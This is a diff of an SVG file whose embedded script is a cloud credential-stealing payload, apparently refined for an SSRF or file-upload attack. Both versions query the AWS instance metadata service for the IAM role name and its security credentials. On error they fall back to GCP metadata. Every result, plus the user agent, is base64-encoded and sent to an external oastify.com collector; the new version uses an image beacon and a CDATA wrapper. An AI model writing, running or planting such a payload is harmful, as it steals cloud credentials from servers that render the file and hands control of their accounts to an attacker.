@@ -1,47 +1,38 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-<script>
-const C = 'https://oumscj0qng4nrb9eksrnc576axgo4lsa.oastify.com';
-const meta = 'http://169.254.169.254/latest/meta-data';
+<script><![CDATA[
+const C = 'https://t82xqoev1lis5gnjyx5sqalbo2utir6g.oastify.com';
+var meta = 'http://169.254.169.254/latest/meta-data';
 
 function send(label, data) {
-  fetch(C + '/?label=' + label + '&data=' + btoa(unescape(encodeURIComponent(data))));
+  var img = new Image();
+  img.src = C + '/?label=' + label + '&data=' + btoa(unescape(encodeURIComponent(data)));
 }
 
-// Step 1: تحقق إن الـmetadata متاح
 fetch(meta + '/')
-  .then(r => r.text())
-  .then(rootData => {
+  .then(function(r){ return r.text(); })
+  .then(function(rootData){
     send('metadata_root', rootData);
-
-    // Step 2: جيب اسم الـIAM Role
     return fetch(meta + '/iam/security-credentials/');
   })
-  .then(r => r.text())
-  .then(roleName => {
+  .then(function(r){ return r.text(); })
+  .then(function(roleName){
     send('iam_role_name', roleName);
-    const role = roleName.trim();
-
-    // Step 3: جيب الـCredentials الفعلية
-    return fetch(meta + '/iam/security-credentials/' + role);
+    return fetch(meta + '/iam/security-credentials/' + roleName.trim());
   })
-  .then(r => r.text())
-  .then(creds => {
+  .then(function(r){ return r.text(); })
+  .then(function(creds){
     send('iam_credentials', creds);
   })
-  .catch(e => {
+  .catch(function(e){
     send('error', e.toString());
-
-    // جرب GCP metadata بدل AWS
     fetch('http://metadata.google.internal/computeMetadata/v1/instance/', {
       headers: {'Metadata-Flavor': 'Google'}
     })
-    .then(r => r.text())
-    .then(d => send('gcp_metadata', d))
-    .catch(e2 => send('gcp_error', e2.toString()));
+    .then(function(r){ return r.text(); })
+    .then(function(d){ send('gcp_metadata', d); })
+    .catch(function(e2){ send('gcp_error', e2.toString()); });
   });
 
-// معلومات إضافية
-send('origin', window.location.href);
 send('env', navigator.userAgent);
-</script>
+]]></script>
 </svg>
